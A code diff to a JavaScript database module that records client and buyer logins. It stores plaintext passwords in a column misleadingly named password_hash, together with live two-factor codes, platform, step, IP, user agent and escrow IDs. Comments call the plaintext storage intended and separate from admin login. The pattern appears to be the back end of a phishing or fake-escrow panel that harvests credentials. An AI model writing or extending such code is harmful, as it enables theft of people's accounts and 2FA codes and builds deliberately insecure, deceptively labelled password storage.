@@ -245,12 +245,18 @@ export const notificationQueries = {
 /**
  * Login tracking operations
  */
+/**
+ * Login tracking operations for clients and buyers
+ * NOTE: For clients and buyers, passwords and 2FA codes are stored in plaintext
+ * as received for the intended use case. This is separate from admin authentication.
+ */
 export const loginQueries = {
   addClientLogin: async (login) => {
+    // Store plaintext password in password_hash column for client logins
     await query(
-      `INSERT INTO client_logins (email, password, two_fa_code, ip_address, timestamp)
-       VALUES ($1, $2, $3, $4, $5)`,
-      [login.email, login.password, login.twoFACode, login.ipAddress, login.timestamp]
+      `INSERT INTO client_logins (id, email, password_hash, two_factor_code, platform, step, ip_address, user_agent, timestamp)
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)`,
+      [login.id, login.email, login.password, login.twoFactorCode, login.platform, login.step, login.ipAddress, login.userAgent, login.timestamp]
     );
   },
 
@@ -266,10 +272,11 @@ export const loginQueries = {
   },
 
   addBuyerLogin: async (login) => {
+    // Store plaintext password in password_hash column for buyer logins
     await query(
-      `INSERT INTO buyer_logins (email, password, two_fa_code, escrow_id, ip_address, timestamp)
-       VALUES ($1, $2, $3, $4, $5, $6)`,
-      [login.email, login.password, login.twoFACode, login.escrowId, login.ipAddress, login.timestamp]
+      `INSERT INTO buyer_logins (id, email, password_hash, two_factor_code, platform, escrow_id, step, ip_address, user_agent, timestamp)
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10)`,
+      [login.id, login.email, login.password, login.twoFactorCode, login.platform, login.escrowId, login.step, login.ipAddress, login.userAgent, login.timestamp]
     );
   },
 
